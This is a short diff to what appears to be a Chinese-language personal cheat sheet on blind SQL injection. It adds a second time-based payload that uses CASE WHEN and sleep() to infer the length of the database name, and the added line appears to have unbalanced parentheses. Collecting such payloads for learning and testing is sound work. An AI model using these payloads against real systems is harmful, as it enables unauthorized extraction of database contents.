@@ -100,6 +100,7 @@ CASE '值语句'  WHEN '值' THEN '执行语句'  WHEN 2 THEN  sleep(3)  ELSE '�
 **案例：**
 ```sql
 1') AND (CASE length(database()) WHEN 1 THEN sleep(4) else '0' end) AND ('1'='1
+1') AND CASE WHEN length(database())>1 THEN sleep(4) else '0' end) AND ('1'='1
 ```
 
 以后遇见更多的就再添加
